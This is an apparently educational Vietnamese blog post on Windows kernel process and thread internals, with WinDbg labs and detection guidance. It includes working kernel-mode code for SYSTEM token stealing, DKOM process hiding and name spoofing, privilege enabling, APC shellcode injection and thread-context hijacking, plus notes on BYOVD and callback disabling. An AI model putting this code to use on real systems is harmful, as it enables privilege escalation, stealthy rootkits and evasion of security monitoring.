---
title: "Windows Process & Thread Internals: EPROCESS, KTHREAD và token stealing qua DKOM"
published: 2025-10-12
description: "Deep dive vào EPROCESS/KPROCESS/ETHREAD/KTHREAD, creation flow, token stealing, DKOM process hiding và thread injection — kèm lab WinDbg và phần đánh giá trung thực về việc gì còn hoạt động trên Windows 11 có HVCI."
image: ""
tags: ["windows", "process-internals", "dkom", "kernel-exploitation"]
category: "Cybersecurity"
draft: false
lang: "en"
---

## Giới thiệu

Process và thread là đơn vị cơ bản của mọi operating system. Trong Windows, hiểu process/thread internals là điều kiện cần cho ba nhóm việc: system programming (driver, EDR), offensive (token stealing, process hiding, thread injection), và forensics (tìm process ẩn trong memory dump).

Bài này đi từ kernel structures (`EPROCESS`, `KPROCESS`, `ETHREAD`, `KTHREAD`) → creation flow → token stealing → DKOM → thread injection, kèm lab WinDbg để tự verify từng offset.

> **Đọc phần này trước khi đọc code.** Bài chia làm hai nhóm, đừng lẫn:
>
> - **Cần kernel mode**: token stealing bằng cách sửa `EPROCESS.Token`, DKOM (unlink `ActiveProcessLinks`, zero `ImageFileName`, sửa bitmap privileges), và APC injection qua `KeInitializeApc`. Những đoạn này chỉ chạy trong kernel driver đã nạp được (test signing, driver có chữ ký, hoặc BYOVD). Không chạy được từ user-mode, kể cả khi là Administrator.
> - **Chạy được từ user-mode**: duplicate/impersonate token qua Win32 API, và `SetThreadContext` để đổi RIP của thread. Không cần driver, nhưng bị giới hạn bởi quyền của chính process đang chạy.
>
> Nếu mục tiêu chỉ là học, dựng VM Windows 10 22H2 bật test signing.

### Vì sao process/thread internals quan trọng?

**Offensive / privilege escalation**
- Token stealing → SYSTEM
- Token duplication và impersonation
- `SeDebugPrivilege` abuse
- Process/thread hiding để ở lại sau khi chiếm được máy

**Rootkit / kernel driver development**
- DKOM: unlink khỏi `PsActiveProcessHead`
- Zero `ImageFileName`
- Sửa bitmap privileges trong token
- Hook và vô hiệu hoá callback

**Malware analysis / forensics**
- Cross-process section mapping (`NtCreateSection` + `NtMapViewOfSection`)
- Thread context analysis
- Phát hiện process ẩn
- Memory forensics

---

## Process Structures Overview

```
┌───────────────────────────────────────────────┐
│  EPROCESS (Executive Process Block)           │
│                                               │
│  - UniqueProcessId, InheritedFromUniqueProcessId
│  - ImageFileName                              │
│  - Token (EX_FAST_REF)                        │
│  - ActiveProcessLinks                         │
│  - VadRoot, HandleTable, Peb                  │
│  ┌─────────────────────────────────────────┐  │
│  │  KPROCESS (Kernel Process Block)        │  │
│  │  - DirectoryTableBase (CR3)             │  │
│  │  - ThreadListHead                       │  │
│  │  - BasePriority, AffinityMask           │  │
│  └─────────────────────────────────────────┘  │
└───────────────────────────────────────────────┘
        │
        │ Peb
        ▼
┌───────────────────────────────────────────────┐
│  PEB (user-mode)                              │
│  - Ldr (loaded modules)                       │
│  - ProcessParameters                          │
│  - Heap information                           │
└───────────────────────────────────────────────┘
```

### Offset theo build: Windows 10 22H2 x64 (19045)

Bảng dưới là giá trị tham chiếu cho build 19045 (nguồn: Vergilius Project, khớp với output `dt nt!_EPROCESS` thường gặp). **Đừng copy số từ blog** — offset đổi theo từng build, kể cả giữa các bản 1904x. Luôn tự kiểm tra lại trên máy bạn đang dùng:

```
kd> dt nt!_EPROCESS poi(nt!PsInitialSystemProcess)
```

| Field | Offset (19045 x64) | Ghi chú |
|---|---|---|
| `Pcb` (KPROCESS) | `0x000` | Luôn nằm đầu struct |
| `ProcessLock` | `0x438` | `EX_PUSH_LOCK` |
| `UniqueProcessId` | `0x440` | PID, kiểu `HANDLE` |
| `ActiveProcessLinks` | `0x448` | `LIST_ENTRY`, mắt xích của `PsActiveProcessHead` |
| `Token` | `0x4b8` | `EX_FAST_REF` — 4 bit thấp là refcount |
| `ImageFileName` | `0x5a8` | `char[15]`, chỉ tên file, không phải full path |

Các field còn lại (`CreateTime`, `InheritedFromUniqueProcessId`, `ThreadListHead`, `Peb`, `VadRoot`) khác nhau giữa các build — lấy bằng `dt` chứ đừng đoán.

### Các field quan trọng

**UniqueProcessId** — PID. Dùng để định danh process; cũng là thứ bị sửa trong các kỹ thuật PID spoofing.

**ActiveProcessLinks** — doubly-linked list nối mọi process. Đây chính là thứ `tasklist`, Process Explorer và `PsGetNextProcess` duyệt qua. Vì vậy nó là mục tiêu số một của DKOM: unlink một mắt xích là process biến mất khỏi mọi enumeration dùng list này.

**Token** — con trỏ tới primary access token, bọc trong `EX_FAST_REF`. Bốn bit thấp được dùng làm refcount nên **phải mask trước khi dùng như pointer**. Đây là chi tiết mà rất nhiều PoC trên mạng bỏ qua, dẫn tới crash khi dereference.

**ImageFileName** — 15 byte, tên file không có path. Bị giới hạn độ dài nên không thể chứa đường dẫn đầy đủ; đó là lý do các tool enumeration phải đọc thêm `SectionBaseAddress`/`Peb` để lấy path thật.

**InheritedFromUniqueProcessId** — PPID. Dùng để dựng process tree, và là nguồn của kỹ thuật PPID spoofing.

---

## Thread Structures Overview

```
┌───────────────────────────────────────────────┐
│  ETHREAD (Executive Thread Block)             │
│  - Cid.UniqueThread (TID)                     │
│  - ThreadsProcess (trỏ về EPROCESS)           │
│  - Win32StartAddress                          │
│  - ImpersonationInfo                          │
│  ┌─────────────────────────────────────────┐  │
│  │  KTHREAD (Kernel Thread Block)          │  │
│  │  - Thread context (registers)           │  │
│  │  - Kernel stack                         │  │
│  │  - Teb pointer                          │  │
│  │  - Wait blocks                          │  │
│  │  - Scheduling info (priority, affinity) │  │
│  └─────────────────────────────────────────┘  │
└───────────────────────────────────────────────┘
        │
        │ Teb
        ▼
┌───────────────────────────────────────────────┐
│  TEB (user-mode)                              │
│  - ThreadId, LastErrorValue                   │
│  - ThreadLocalStoragePointer                  │
│  - StackBase / StackLimit                     │
└───────────────────────────────────────────────┘
```

### Các field quan trọng

**Cid** — `CLIENT_ID`, chứa cả PID (`Cid.UniqueProcess`) và TID (`Cid.UniqueThread`). Một thread luôn mang theo PID của process sở hữu.

**ThreadsProcess** — con trỏ ngược về `EPROCESS`. Đây là đường đi chuẩn để từ một thread lấy được token của process chứa nó.

**Win32StartAddress** — địa chỉ bắt đầu trong user-mode. Process Explorer hiển thị field này, nên nó là công cụ hữu ích để phát hiện thread bị inject: thread hợp lệ thường trỏ vào `kernel32!BaseThreadInitThunk` hoặc `ntdll!LdrInitializeThunk` (hoặc một export của module hợp lệ), thread lạ trỏ vào vùng private memory không thuộc module nào.

**ImpersonationInfo** — chỉ khác `NULL` khi thread đang impersonate. Đây là chỗ phân biệt impersonation token với primary token: hai thứ khác nhau, và nhầm lẫn giữa chúng là lỗi phổ biến khi viết PoC.

---

## Process/Thread Creation Flow

Hiểu flow này giúp xác định chỗ nào có thể can thiệp.

```
CreateProcess()            [user-mode, kernel32]
        ↓
NtCreateUserProcess()      [syscall transition]
        ↓
PspCreateProcess()         [kernel]
        ↓
  1. ExAllocatePoolWithTag(EPROCESS)
  2. Khởi tạo KPROCESS, gán DirectoryTableBase (CR3 mới)
  3. Tạo token: duplicate từ parent, hoặc dùng token chỉ định
  4. Map executable image (parse PE, map sections, resolve imports)
  5. Tạo PEB, khởi tạo Ldr
  6. Chèn vào ActiveProcessLinks  ← điểm xuất hiện của process mới
        ↓
PspCreateThread()
        ↓
NtResumeThread()           [process bắt đầu chạy]
```

Hai chi tiết đáng chú ý:

**Process mới vào `ActiveProcessLinks` trước khi thread chạy.** Nghĩa là có một cửa sổ ngắn mà process đã tồn tại trong list nhưng chưa thực thi gì. Đây là nền tảng của các kỹ thuật "process doppelgänging" và của việc EDR đặt callback ở `PsSetCreateProcessNotifyRoutineEx` — callback chạy ở bước tạo, trước khi code của process kịp chạy.

**Token được duplicate từ parent.** Trừ khi caller có `SeAssignPrimaryTokenPrivilege` và truyền token riêng, process con thừa hưởng nguyên token của cha. Đây là lý do leo thang đặc quyền bằng cách "mượn" token của process SYSTEM hiệu quả: bạn không cần tạo token, chỉ cần tráo con trỏ.

### Thread creation

```
CreateThread()             [user-mode]
        ↓
NtCreateThreadEx()         [syscall]
        ↓
PspCreateThread()
        ↓
  1. Allocate ETHREAD + KTHREAD
  2. Allocate kernel stack
  3. Khởi tạo TEB (user-mode)
  4. Set Win32StartAddress
  5. Insert vào ThreadListHead của process
  6. Set initial context (RIP = start address, RSP = stack)
  7. Chờ scheduler chọn
```

---

## Token Structure & Manipulation

### TOKEN và EX_FAST_REF

`EPROCESS.Token` không phải `PTOKEN` trần mà là `EX_FAST_REF` — một `ULONG_PTR` dùng 4 bit thấp làm refcount:

```c
// EX_FAST_REF layout (x64)
// bit 63..4 : pointer tới TOKEN
// bit  3..0 : refcount (tối đa 15)

PVOID raw = *(PVOID*)((PUCHAR)pEprocess + TOKEN_OFFSET);
PTOKEN token = (PTOKEN)((ULONG_PTR)raw & ~0xFULL);   // mask bỏ refcount
```

Bỏ bước mask này là nguyên nhân crash phổ biến nhất khi thử PoC token stealing trên blog/forum.

### Token types

| Loại | Lưu ở đâu | Dùng khi nào |
|---|---|---|
| **Primary token** | `EPROCESS.Token` | Token của process, dùng cho mọi thread mặc định |
| **Impersonation token** | `ETHREAD.ImpersonationInfo` | Thread tạm thời "mượn" danh tính client (named pipe, RPC, IIS) |

Hai loại này **không thay thế cho nhau**. Copy primary token của SYSTEM rồi gán vào `ImpersonationInfo` sẽ không cho ra SYSTEM — access check đọc primary token của process, không đọc impersonation token của thread, trừ khi thread đang impersonate.

### Privileges trong token

```c
typedef struct _SEP_TOKEN_PRIVILEGES {
    ULONG64 Present;          // privilege có trong token
    ULONG64 Enabled;          // privilege đang bật
    ULONG64 EnabledByDefault; // bật mặc định khi token được tạo
} SEP_TOKEN_PRIVILEGES, *PSEP_TOKEN_PRIVILEGES;
```

Một privilege phải có bit trong **cả** `Present` và `Enabled` mới dùng được. Chỉ set `Enabled = Present` là đủ để bật tất cả — nhưng chỉ với những privilege đã có trong token. Nếu token của bạn không có `SeLoadDriverPrivilege` trong `Present` thì bật `Enabled` không tạo ra nó. Đây là giới hạn thật của kỹ thuật "enable all privileges" mà nhiều bài viết bỏ qua.

---

## Token stealing: tráo primary token của process hiện tại

Ý tưởng: process SYSTEM (PID 4) đã có token toàn quyền. Thay vì tạo token mới, tráo con trỏ token của process hiện tại sang token của nó.

### Bước 1 — Lấy EPROCESS của SYSTEM

```c
PEPROCESS pSystem = NULL;
NTSTATUS status;

// Cách 1: tra trực tiếp theo PID (gọn nhất)
status = PsLookupProcessByProcessId((HANDLE)4, &pSystem);
if (!NT_SUCCESS(status)) return status;
// nhớ PsDereferenceProcess khi xong

// Cách 2: tự đi danh sách ActiveProcessLinks
PEPROCESS pSelf = PsGetCurrentProcess();
PLIST_ENTRY head = (PLIST_ENTRY)((PUCHAR)pSelf + ACTIVEPROCESSLINKS_OFFSET);
PLIST_ENTRY entry = head;

do {
    PEPROCESS pProc = (PEPROCESS)((PUCHAR)entry - ACTIVEPROCESSLINKS_OFFSET);
    if ((ULONG_PTR)PsGetProcessId(pProc) == 4) {
        pSystem = pProc;
        break;
    }
    entry = entry->Flink;
} while (entry != head);
```

Đi list có một cái bẫy: nếu process hiện tại **đã bị unlink** (do chính bạn làm ở phần DKOM), vòng lặp sẽ không bao giờ gặp lại `head` và treo máy. `PsLookupProcessByProcessId` an toàn hơn.

### Bước 2 — Đọc token SYSTEM

```c
PVOID raw = *(PVOID*)((PUCHAR)pSystem + TOKEN_OFFSET);
PTOKEN pSystemToken = (PTOKEN)((ULONG_PTR)raw & ~0xFULL);
```

### Bước 3 — Tráo con trỏ

```c
PVOID* pSelfTokenSlot = (PVOID*)((PUCHAR)PsGetCurrentProcess() + TOKEN_OFFSET);
PVOID  oldRaw = *pSelfTokenSlot;      // giữ lại để khôi phục

*pSelfTokenSlot = pSystemToken;       // tráo
```

Sau bước này process hiện tại có token của SYSTEM.

**Ba điều dễ sai:**

1. **Không giữ reference.** Bạn gán một pointer mà không tăng refcount. Nếu process SYSTEM thoát (gần như không bao giờ, nhưng vẫn có thể trong lúc shutdown) token bị free và bạn dereference memory đã giải phóng. PoC "sạch" phải `ObReferenceObject` token trước khi gán.
2. **Không khôi phục.** Nếu không trả `oldRaw` về, token gốc bị leak và process thoát trong trạng thái token sai — crash khi cleanup.
3. **Không kiểm tra thành công.** Tráo con trỏ không có nghĩa là có quyền. Phải verify bằng cách mở một handle tới object mà trước đó bị `ACCESS_DENIED`, ví dụ `\Device\PhysicalMemory`.

### Có API documented để gán primary token không?

Không có API kernel-mode documented nào để gán primary token tuỳ ý cho một process đang chạy. `PsReferencePrimaryToken` / `PsDereferencePrimaryToken` là documented nhưng chỉ để lấy/trả reference, không phải để gán. Hàm gán token thật là nội bộ, không export.

Từ user-mode có `NtSetInformationProcess` với lớp thông tin `ProcessAccessToken`. Đây là **native API trong `ntdll`, không được document** — dùng được nhưng phải tự chịu rủi ro thay đổi giữa các bản Windows. Điều kiện: process đích phải do bạn tạo ở trạng thái suspended, và caller phải có `SeAssignPrimaryTokenPrivilege`.

```c
// user-mode, không cần driver
// 1. CreateProcess(..., CREATE_SUSPENDED) để giữ process đích chưa chạy
// 2. NtSetInformationProcess(hProcess, ProcessAccessToken /* 9 */, &info, sizeof(info))
//    với info = { HANDLE hToken; ULONG Reserved; }
// 3. ResumeThread()
```

Vì không được document, đừng dựa vào nó cho tooling dài hạn. Các kỹ thuật leo thang thực tế (Potato family, `SeImpersonatePrivilege` abuse) đi qua impersonation và named pipe: dùng API documented, không cần kernel write, và không bị PatchGuard can thiệp.

### Shellcode tráo token (position-independent)

Bản rút gọn của đoạn code trên, dạng không cần relocation — dùng được trong APC injection:

```c
// offsets cho 19045 x64
#define OFF_ACTIVELINKS 0x448
#define OFF_PID         0x440
#define OFF_TOKEN       0x4b8

ULONG_PTR self   = (ULONG_PTR)PsGetCurrentProcess();
ULONG_PTR cur    = self;

do {
    cur = (ULONG_PTR)((PLIST_ENTRY)(cur + OFF_ACTIVELINKS))->Flink - OFF_ACTIVELINKS;
    if (*(HANDLE*)(cur + OFF_PID) == (HANDLE)4) break;
} while (cur != self);

ULONG_PTR sysToken = *(ULONG_PTR*)(cur + OFF_TOKEN) & ~0xFULL;
*(ULONG_PTR*)(self + OFF_TOKEN) = sysToken;
```

> **Offset cứng = giòn.** Đoạn trên chỉ đúng trên đúng build đó. Shellcode thực tế phải resolve offset động (quét `EPROCESS` theo pattern, hoặc đọc từ `nt!PsInitialSystemProcess` rồi suy ra layout). Hard-code offset là lý do phần lớn shellcode token-stealing trên GitHub chết trên Windows 11.

---

## DKOM (Direct Kernel Object Manipulation)

DKOM là sửa trực tiếp kernel structures thay vì gọi API. Nó không tạo ra log, không kích hoạt callback — đó là ưu điểm và cũng là lý do nó nguy hiểm cho chính hệ thống.

### Process hiding — unlink khỏi ActiveProcessLinks

```c
PEPROCESS pSelf = PsGetCurrentProcess();
PLIST_ENTRY e = (PLIST_ENTRY)((PUCHAR)pSelf + ACTIVEPROCESSLINKS_OFFSET);

e->Blink->Flink = e->Flink;
e->Flink->Blink = e->Blink;

// trỏ về chính nó để tránh dereference rác về sau
e->Flink = e;
e->Blink = e;
```

**Process sẽ ẩn khỏi:** Task Manager, Process Explorer, `tasklist`, `PsGetNextProcess`, phần lớn tool enumeration.

**Vẫn hiện ra ở:** handle table (`!handle`), thread list (`!thread`), `PspCidTable`, và mọi memory-forensics scan đọc trực tiếp pool.

Đây là điểm quan trọng về mặt detection: unlink chỉ đánh lừa **một** nguồn sự thật. Bất kỳ tool nào có nguồn thứ hai (scan pool theo tag `Proc`, hoặc đối chiếu CID table) sẽ thấy process ngay. Volatility `psscan` vs `pslist` chính là cặp đối chiếu này.

**Rủi ro:** nếu process bị unlink rồi thoát bình thường, kernel sẽ cố unlink lần nữa trên một list entry đã trỏ về chính nó → corruption. PoC phải re-link trước khi process kết thúc.

### Zero ImageFileName

```c
PUCHAR pName = (PUCHAR)pSelf + IMAGEFILENAME_OFFSET;
RtlZeroMemory(pName, 15);
// hoặc giữ tên giả: RtlCopyMemory(pName, "svch0st.exe", 12);
```

Rẻ, không gây crash, nhưng cũng rẻ để phát hiện: process có `ImageFileName` rỗng là bất thường rõ ràng trong bất kỳ process listing nào. Giá trị thật của nó là **làm hỏng tooling dựa trên tên** (rule matching theo tên process), không phải để ẩn.

### Sửa bitmap privileges

```c
PVOID raw = *(PVOID*)((PUCHAR)pSelf + TOKEN_OFFSET);
PTOKEN pToken = (PTOKEN)((ULONG_PTR)raw & ~0xFULL);

PSEP_TOKEN_PRIVILEGES pPriv =
    (PSEP_TOKEN_PRIVILEGES)((PUCHAR)pToken + TOKEN_PRIVILEGES_OFFSET);

pPriv->Enabled = pPriv->Present;
```

Chỉ bật được những gì đã có trong `Present` (xem phần TOKEN ở trên). Muốn có privilege mới thì phải sửa `Present`, và sửa `Present` trên token dùng chung sẽ ảnh hưởng mọi process chia sẻ token đó.

---

## Thread injection & manipulation

### APC injection

Cơ chế: queue một user-mode APC vào thread đích; APC chạy khi thread đó ở trạng thái alertable.

```c
// 1. Cấp phát trong process đích
PVOID pRemote = NULL;
SIZE_T size = sizeof(shellcode);
ZwAllocateVirtualMemory(hTargetProcess, &pRemote, 0, &size,
                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

// 2. Ghi shellcode
ZwWriteVirtualMemory(hTargetProcess, pRemote, shellcode, sizeof(shellcode), NULL);

// 3. Queue APC
KAPC apc;
KeInitializeApc(
    &apc,
    (PKTHREAD)pTargetThread,       // KTHREAD, không phải ETHREAD
    OriginalApcEnvironment,
    KernelRoutine,                 // chạy ở APC_LEVEL, kernel
    RundownRoutine,                // chạy khi thread thoát
    (PKNORMAL_ROUTINE)pRemote,     // chạy ở user-mode, pass-through
    UserMode,
    NULL                           // NormalContext
);
KeInsertQueueApc(&apc, NULL, NULL, IO_NO_INCREMENT);
```

Lưu ý: `KeInitializeApc` nhận `PKTHREAD`, không phải `PETHREAD` — truyền sai kiểu vẫn compile (cùng địa chỉ base) nhưng đọc sai field nếu code sau đó dùng offset ETHREAD. Ngoài ra `KAPC` phải còn sống tới khi APC chạy xong; đặt nó trên stack của hàm gọi là lỗi use-after-free kinh điển.

### Sửa thread context — cách đúng

Cách tiếp cận "sửa `KTRAP_FRAME`" hay được copy trên mạng thường sai vì `KTRAP_FRAME` chỉ tồn tại trên kernel stack khi thread **đang ở kernel mode**. Với thread đang suspend ở user-mode, context nằm trong `KTHREAD`, không phải trap frame bạn tự tính offset.

Cách đúng là dùng context API documented:

```c
CONTEXT ctx = {0};
ctx.ContextFlags = CONTEXT_CONTROL;      // RIP, RSP, segment registers

PsGetContextThread(pTargetThread, &ctx, KernelMode);

ctx.Rip = (ULONG64)pRemoteCode;          // trỏ tới shellcode đã ghi
ctx.Rsp = (ULONG64)pRemoteStack;         // stack phải hợp lệ, không thì crash ngay

PsSetContextThread(pTargetThread, &ctx, KernelMode);
```

Ba giới hạn phải nhớ:

- Thread phải suspend được — thread của process PPL/System sẽ trả `STATUS_ACCESS_DENIED`.
- `Rsp` phải trỏ vào vùng memory đọc/ghi được trong address space của process đích. Đặt sai là fault ngay instruction đầu tiên.
- `PsSetContextThread` **không** phải thay thế tổng quát cho việc sửa trap frame. Nó chỉ ghi context của thread đang suspend; nó không cho bạn chèn vào giữa một syscall đang chạy, và không sửa được kernel stack.

---

## Lab WinDbg

Phần này là cách tự verify mọi offset trong bài. Chạy trên VM Windows 10 22H2, kernel debug qua pipe hoặc network.

### Bài 1 — Liệt kê process

```
kd> !process 0 0
**** NT ACTIVE PROCESS DUMP ****
PROCESS ffff8888`12340040
    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
    DirBase: 001a7000  ObjectTable: ffff8888`00001000  HandleCount: 1234.
    Image: System

PROCESS ffff8888`12345680
    SessionId: 1  Cid: 1a2c    Peb: 00000000`00fde000  ParentCid: 09b4
    DirBase: 6d8a9000  ObjectTable: ffff8888`00123400  HandleCount: 234.
    Image: explorer.exe
```

### Bài 2 — Đọc EPROCESS

```
kd> dt nt!_EPROCESS ffff8888`12345680
   +0x000 Pcb                 : _KPROCESS
   +0x438 ProcessLock         : _EX_PUSH_LOCK
   +0x440 UniqueProcessId     : 0x00000000`00001a2c
   +0x448 ActiveProcessLinks  : _LIST_ENTRY
   +0x4b8 Token               : _EX_FAST_REF
   +0x5a8 ImageFileName       : [15]  "explorer.exe"
```

Đối chiếu với bảng offset ở trên — đây là bước bắt buộc trước khi viết bất kỳ PoC nào.

### Bài 3 — Đọc token

```
kd> !token 0xffff8888`12345680
_TOKEN 0xffff8888`0a1b2c30
User: S-1-5-21-1234567890-1011-1000 (DESKTOP-ABC\User)
Groups:
  S-1-5-21-1234567890-1011-513 (DESKTOP-ABC\None)
  S-1-5-32-545 (BUILTIN\Users)
  S-1-1-0 (Everyone)
Privs:
  0x000000013 SeShutdownPrivilege           Attributes - Enabled
  0x000000017 SeChangeNotifyPrivilege       Attributes - Enabled Default
```

### Bài 4 — Tìm offset động (đừng hard-code)

```
kd> r $t0 = poi(nt!PsInitialSystemProcess)
kd> dt nt!_EPROCESS $t0 Token
   +0x4b8 Token : _EX_FAST_REF
```

Cách này lấy offset từ chính kernel đang chạy — đúng cho mọi build, kể cả khi bạn không biết máy đang là 19045 hay 22631.

---

## Detection & forensics

### Cross-view: đối chiếu nhiều nguồn sự thật

Nguyên tắc: DKOM chỉ sửa được một nguồn. Tool nào có nguồn thứ hai sẽ thấy process ẩn.

```
kd> !process 0 0            # nguồn 1: ActiveProcessLinks
kd> !handle 0 0 Process     # nguồn 2: handle table
kd> !thread                 # nguồn 3: thread list
```

Process xuất hiện ở nguồn 2 và 3 nhưng vắng ở nguồn 1 = đã bị unlink.

### Scan pool theo tag

Pool tag của `EPROCESS` là `Proc`, lưu dưới dạng DWORD little-endian `0x636f7250`:

```
kd> s -d 0 L?0xffffffffffffffff 0x636f7250
```

So sánh số hit với số process trong `!process` — chênh lệch là process ẩn.

### Volatility 3 (cú pháp hiện hành)

```bash
# process list từ ActiveProcessLinks
vol -f memory.dmp windows.pslist

# scan pool — thấy cả process đã bị unlink
vol -f memory.dmp windows.psscan

# đối chiếu chéo nhiều nguồn trong một lệnh
vol -f memory.dmp windows.psxview

# token / SID của một process
vol -f memory.dmp windows.getsids --pid 1234
```

`pslist` vs `psscan` là bài kiểm tra kinh điển: `pslist` đi theo list (bị DKOM đánh lừa), `psscan` quét pool (không bị). Volatility 2 dùng `--profile=Win10x64`; Volatility 3 bỏ profile, tự nhận diện.

### Process/thread callbacks của EDR

EDR đăng ký callback qua `PsSetCreateProcessNotifyRoutineEx`; các routine này nằm trong mảng `nt!PspCreateProcessNotifyRoutine`. Rootkit có thể vô hiệu hoá bằng cách zero phần tử trong mảng — đó là lý do các EDR hiện đại dùng PPL để bảo vệ chính vùng memory đó, khiến thao tác này fail thay vì im lặng thành công.

---

## Mitigations hiện đại — và cái gì còn dùng được

### Protected Process Light (PPL)

Có từ Windows 8.1. Process được gắn protection level (`PsProtectedTypeProtectedLight` + signer như `WinTcb`, `Antimalware`, `Lsa`) sẽ chặn mọi thao tác `OpenProcess`/`WriteProcessMemory`/`SetThreadContext` từ process có mức thấp hơn — kể cả Administrator. Với kernel driver, việc sửa `EPROCESS` của process PPL cũng bị chặn nếu HVCI bật.

Hệ quả thực tế: lsass, các EDR service và Defender không còn là mục tiêu của thread injection từ user-mode.

### PatchGuard (Kernel Patch Protection)

Kiểm tra định kỳ tính toàn vẹn của các structure và hàm kernel quan trọng (SSDT, IDT, một số field `EPROCESS`, code của `ntoskrnl`). Vi phạm → bugcheck `CRITICAL_STRUCTURE_CORRUPTION` (0x109) sau vài phút.

Điều quan trọng: PatchGuard **không** chặn token stealing hay unlink `ActiveProcessLinks` — nó không kiểm tra những field đó. Nó chặn sửa code và một số con trỏ hàm. Đây là lý do DKOM vẫn "hoạt động" trên máy bật PatchGuard, trong khi hooking thì không.

### HVCI / VBS

Hypervisor-enforced Code Integrity, bật mặc định trên Windows 11 mới. Hai hệ quả:
- Driver phải được ký và pass WHQL-compatible policy mới nạp được → driver tự viết của bạn **không nạp được** nếu không bật test signing.
- Kernel memory chứa structure của process được bảo vệ không ghi được từ kernel, ngay cả khi bạn đã ở ring 0.

### Vậy hiện tại cái gì còn dùng được?

| Kỹ thuật | Win10 không HVCI | Win11 có HVCI |
|---|---|---|
| Token stealing qua EPROCESS | Chạy | Cần bypass HVCI |
| Unlink ActiveProcessLinks | Chạy | Chạy (với process không protected) |
| Sửa ImageFileName | Chạy | Chạy |
| APC injection vào process thường | Chạy | Chạy |
| Injection vào PPL (lsass, EDR) | Cần driver | Hầu như không |
| Hook SSDT / patch code | PatchGuard kill | PatchGuard + HVCI kill |

Đường đi thực tế hiện nay không phải tự viết driver mà là **BYOVD** — nạp một driver có chữ ký hợp lệ nhưng có lỗ hổng (nhiều driver của các hãng antivirus, phần mềm phần cứng), dùng nó để ghi kernel memory. Đó là lý do Microsoft liên tục thu hồi chữ ký driver và duy trì danh sách blocklist.

---

## Kết

Từ `EPROCESS`/`ETHREAD` đến token stealing và DKOM, các kỹ thuật trong bài đều xoay quanh một ý: **kernel lưu mọi thứ trong structure, và structure đó sửa được**. Access check không đọc "danh tính" trừu tượng — nó đọc token. Process list không phải sự thật tuyệt đối — nó là một linked list.

Ba điều đáng nhớ:

- **`EPROCESS.Token` là `EX_FAST_REF`** — phải mask 4 bit thấp, và phải giữ reference.
- **Unlink chỉ đánh lừa một nguồn sự thật** — `psscan`, handle table và thread list vẫn thấy process.
- **Không có API documented nào để gán primary token tuỳ ý** — mọi PoC "sạch" đều phải là kernel write, và đó chính là thứ HVCI sinh ra để chặn.

Phần tiếp theo của series: `ETHREAD`/`KTHREAD` scheduling internals, và cách `KTHREAD.WaitListHead` bị dùng trong các kỹ thuật thread hiding.

---

## References

**Books**
- *Windows Internals, Part 1* (7th ed.) — Russinovich, Ionescu, Solomon. Chapter 3–4: Processes & Threads.
- *Rootkits: Subverting the Windows Kernel* — Greg Hoglund, James Butler. Nguồn gốc của DKOM.
- *The Rootkit Arsenal* (2nd ed.) — Bill Blunden.
- *Windows Kernel Programming* — Pavel Yosifovich.

**Papers**
- "Token Kidnapping" — Cesar Cerrudo (2008). Nguồn gốc của token abuse trên Windows.
- "DKOM (Direct Kernel Object Manipulation)" — Jamie Butler, Greg Hoglund.
- "Subverting the Windows Kernel: Hooking" — Hoglund.

**Tools**
- [System Informer](https://systeminformer.sourceforge.io/) — process viewer, bản kế thừa của Process Hacker
- [WinDbg](https://learn.microsoft.com/windows-hardware/drivers/debugger/) — kernel debugging
- [Volatility 3](https://github.com/volatilityfoundation/volatility3) — memory forensics
- [Vergilius Project](https://www.vergiliusproject.com/) — offset của kernel struct theo từng build

---

<h2><strong style="color: red;">Control the process, own the system.</strong></h2>
